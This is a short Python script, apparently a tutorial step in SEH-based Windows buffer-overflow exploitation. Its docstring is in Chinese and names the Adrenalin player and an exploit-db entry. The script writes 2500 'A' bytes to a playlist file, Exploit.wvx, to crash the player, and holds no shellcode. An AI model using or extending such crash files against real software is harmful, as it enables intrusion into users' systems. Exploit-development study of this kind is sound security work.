#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""Windows 缓冲区溢出

基于 SHE 的缓冲区溢出

以 Adrenalin https://www.exploit-db.com/exploits/26525 应用为例

"""

junk = "\x41" * 2500
x = open('Exploit.wvx', 'w')
x.write(junk)
x.close()
